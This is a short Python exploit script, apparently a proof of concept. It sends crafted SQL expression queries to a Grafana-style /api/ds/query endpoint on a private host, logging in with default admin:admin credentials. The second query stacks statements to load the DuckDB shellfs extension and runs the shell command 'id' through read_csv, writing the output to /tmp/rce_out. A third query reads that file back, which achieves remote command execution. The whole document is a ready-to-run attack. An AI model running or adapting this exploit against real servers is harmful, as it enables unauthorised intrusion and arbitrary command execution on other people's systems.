import json
import urllib.request
import urllib.error
from base64 import b64encode

auth_b64 = b64encode(b"admin:admin").decode('utf-8')

url = "http://172.30.0.20:3000/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100"

payload = {
    "queries": [
        {
            "refId": "A",
            "datasource": {"type": "__expr__", "uid": "__expr__", "name": "Expression"},
            "type": "sql",
            "expression": "SELECT 1"
        },
        {
            "refId": "B",
            "datasource": {"type": "__expr__", "uid": "__expr__", "name": "Expression"},
            "type": "sql",
            "expression": "SELECT 1 FROM A ;LOAD shellfs;SELECT * FROM read_csv('id > /tmp/rce_out 2>&1 |', header=false)"
        },
        {
            "refId": "C",
            "datasource": {"type": "__expr__", "uid": "__expr__", "name": "Expression"},
            "type": "sql",
            "expression": "SELECT b.content FROM A AS a, read_blob('/tmp/rce_out') AS b"
        }
    ],
    "from": "1",
    "to": "2"
}

data = json.dumps(payload).encode('utf-8')

req = urllib.request.Request(
    url,
    data=data,
    headers={
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": f"Basic {auth_b64}"
    },
    method='POST'
)

try:
    with urllib.request.urlopen(req, timeout=30) as response:
        print(f"Статус код: {response.status}")
        print(f"Ответ: {json.loads(response.read().decode('utf-8'))}")
except urllib.error.URLError as e:
    print(f"Ошибка: {e}")
